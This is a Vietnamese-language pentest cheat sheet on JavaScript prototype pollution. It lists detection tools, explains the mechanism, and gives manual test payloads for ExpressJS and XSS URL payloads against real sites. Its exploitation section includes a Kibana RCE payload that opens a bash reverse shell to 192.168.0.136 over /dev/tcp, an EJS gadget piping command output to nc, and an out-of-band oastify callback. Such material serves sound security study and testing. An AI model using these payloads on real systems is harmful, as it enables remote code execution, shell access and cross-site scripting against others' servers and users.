# Prototype Pollution

> Prototype pollution là một loại lỗ hổng xảy ra trong JavaScript khi các thuộc tính của Object.prototype bị sửa đổi. Điều này đặc biệt nguy hiểm vì các object trong JavaScript có tính động và chúng ta có thể thêm thuộc tính vào chúng bất kỳ lúc nào. Ngoài ra, gần như tất cả các object trong JavaScript đều kế thừa từ Object.prototype, khiến nó trở thành một vector tấn công tiềm năng.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)

  * [Ví dụ](#examples)
  * [Kiểm thử thủ công](#manual-testing)
  * [Prototype Pollution thông qua JSON Input](#prototype-pollution-via-json-input)
  * [Prototype Pollution trong URL](#prototype-pollution-in-url)
  * [Payload Prototype Pollution](#prototype-pollution-payloads)
  * [Prototype Pollution Gadget](#prototype-pollution-gadgets)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* https://github.com/yeswehack/pp-finder - Hỗ trợ tìm gadget để khai thác prototype pollution
* https://github.com/yuske/silent-spring - Prototype Pollution dẫn đến Remote Code Execution trong Node.js
* https://github.com/yuske/server-side-prototype-pollution - Các gadget Server-Side Prototype Pollution trong mã core của Node.js và các package NPM bên thứ ba
* https://github.com/BlackFan/client-side-prototype-pollution - Prototype Pollution và các Script Gadget hữu ích
* https://github.com/portswigger/server-side-prototype-pollution - Burp Suite Extension để phát hiện các lỗ hổng Prototype Pollution
* https://github.com/msrkp/PPScan - Client-Side Prototype Pollution Scanner

## Phương pháp

Trong JavaScript, prototype là cơ chế cho phép các object kế thừa các đặc tính từ những object khác. Nếu kẻ tấn công có thể thêm hoặc sửa đổi các thuộc tính của `Object.prototype`, chúng về cơ bản có thể ảnh hưởng đến tất cả các object kế thừa từ prototype đó, từ đó có khả năng dẫn đến nhiều loại rủi ro bảo mật khác nhau.

```js
var myDog = new Dog();
```

```js
// Trỏ đến function "Dog"
myDog.constructor;
```

```js
// Trỏ đến định nghĩa class của "Dog"
myDog.constructor.prototype;
myDog.__proto__;
myDog["__proto__"];
```

### Ví dụ

* Hãy tưởng tượng một ứng dụng sử dụng một object để duy trì các thiết lập cấu hình, như sau:

  ```js
  let config = {
      isAdmin: false
  };
  ```

* Kẻ tấn công có thể thêm thuộc tính `isAdmin` vào `Object.prototype`, như sau:

  ```js
  Object.prototype.isAdmin = true;
  ```

### Kiểm thử thủ công

* ExpressJS: `{ "__proto__":{"parameterLimit":1}}` + 2 parameters trong GET request, ít nhất 1 parameter phải được phản ánh trong response.
* ExpressJS: `{ "__proto__":{"ignoreQueryPrefix":true}}` + `??foo=bar`
* ExpressJS: `{ "__proto__":{"allowDots":true}}` + `?foo.bar=baz`
* Thay đổi padding của JSON response: `{ "__proto__":{"json spaces":" "}}` + `{"foo":"bar"}`, server phải trả về `{"foo": "bar"}`
* Sửa đổi CORS header response: `{ "__proto__":{"exposedHeaders":["foo"]}}`, server phải trả về header `Access-Control-Expose-Headers`.
* Thay đổi status code: `{ "__proto__":{"status":510}}`

### Prototype Pollution thông qua JSON Input

Bạn có thể truy cập prototype của bất kỳ object nào thông qua thuộc tính đặc biệt `__proto__`.
Hàm `JSON.parse()` trong JavaScript được sử dụng để phân tích cú pháp một chuỗi JSON và chuyển đổi nó thành một JavaScript object. Thông thường, đây là một sink function nơi prototype pollution có thể xảy ra.

```js
{
    "__proto__": {
        "evilProperty": "evilPayload"
    }
}
```

Payload bất đồng bộ dành cho NodeJS.

```js
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=payload\"\".oastify\"\".com"
  }
}
```

Thực hiện pollute prototype thông qua thuộc tính `constructor` thay thế.

```js
{
    "constructor": {
        "prototype": {
            "foo": "bar",
            "json spaces": 10
        }
    }
}
```

### Prototype Pollution trong URL

Ví dụ về các payload Prototype Pollution được tìm thấy trong thực tế.

```ps1
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

### Khai thác Prototype Pollution

Tùy thuộc vào việc prototype pollution được thực thi ở phía client (CSPP) hay phía server (SSPP), tác động sẽ khác nhau.

* Remote Command Execution: [RCE in Kibana (CVE-2019-7609)](https://web.archive.org/web/20191031042307/https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

  ```js
  .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
  .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
  ```

* Remote Command Execution: [RCE using EJS gadgets](https://web.archive.org/web/20230309172121/https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)

  ```js
  {
      "__proto__": {
          "client": 1,
          "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
      }
  }
  ```

* Reflected XSS: [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://web.archive.org/web/20200928082422/https://hackerone.com/reports/986386)

* Client-side bypass: [Prototype pollution – and bypassing client-side HTML sanitizers](https://web.archive.org/web/20200908002825/https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

* Denial of Service

### Payload Prototype Pollution

```js
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```

### Prototype Pollution Gadget

Một "gadget" trong ngữ cảnh của các lỗ hổng thường đề cập đến một đoạn code hoặc chức năng có thể bị khai thác hoặc tận dụng trong một cuộc tấn công. Khi nói về một "prototype pollution gadget", chúng ta đang đề cập đến một code path, function hoặc feature cụ thể của ứng dụng dễ bị ảnh hưởng hoặc có thể bị khai thác thông qua một cuộc tấn công prototype pollution.

Bạn có thể tự tạo gadget bằng cách sử dụng một phần source code với https://github.com/yeswehack/pp-finder, hoặc thử sử dụng các gadget đã được phát hiện tại https://github.com/yuske/server-side-prototype-pollution / https://github.com/BlackFan/client-side-prototype-pollution.

## Labs

* [YesWeHack Dojo - Prototype Pollution](https://dojo-yeswehack.com/XSS/Training/Prototype-Pollution)
* [PortSwigger - Prototype Pollution](https://portswigger.net/web-security/all-labs#prototype-pollution)

## Tài liệu tham khảo

* [A Pentester's Guide to Prototype Pollution Attacks - Harsh Bothra - January 2, 2023](https://web.archive.org/web/20260111201021/https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)
* [A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild - s1r1us - September 28, 2021](https://web.archive.org/web/20260204200448/https://blog.s1r1us.ninja/research/PP)
* [Detecting Server-Side Prototype Pollution - Daniel Thatcher - February 15, 2023](https://web.archive.org/web/20230221012320/https://www.intruder.io/research/server-side-prototype-pollution)
* [Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609) - Michał Bentkowski - October 30, 2019](https://web.archive.org/web/20250810040511/https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [Keynote | Server Side Prototype Pollution: Blackbox Detection Without The DoS - Gareth Heyes - March 27, 2023](https://web.archive.org/web/20230327103116/https://youtu.be/LD-KcuKM_0M)
* [NodeJS - __proto__ & prototype Pollution - HackTricks - July 19, 2024](https://web.archive.org/web/20241224163723/https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
* [Prototype Pollution - PortSwigger - November 10, 2022](https://web.archive.org/web/20221110144930/https://portswigger.net/web-security/prototype-pollution)
* [Prototype pollution - Snyk - August 19, 2023](https://web.archive.org/web/20211010192146/https://learn.snyk.io/lessons/prototype-pollution/javascript/)
* [Prototype pollution and bypassing client-side HTML sanitizers - Michał Bentkowski - August 18, 2020](https://web.archive.org/web/20200908002825/https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
* [Prototype Pollution and Where to Find Them - BitK & SakiiR - August 14, 2023](https://youtu.be/mwpH9DF_RDA)
* [Prototype Pollution Attacks in NodeJS - Olivier Arteau - May 16, 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)
* [Prototype Pollution Attacks in NodeJS applications - Olivier Arteau - October 3, 2018](https://web.archive.org/web/20190218093454/https://youtu.be/LUsiFV3dsK8)
* [Prototype Pollution Leads to RCE: Gadgets Everywhere - Mikhail Shcherbakov - September 29, 2023](https://web.archive.org/web/20240416043553/https://youtu.be/v5dq80S1WF4)
* [Server side prototype pollution, how to detect and exploit - BitK - February 18, 2023](http://web.archive.org/web/20230218081534/https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/)
* [Server-side prototype pollution: Black-box detection without the DoS - Gareth Heyes - February 15, 2023](https://web.archive.org/web/20260219234352/https://portswigger.net/research/server-side-prototype-pollution)
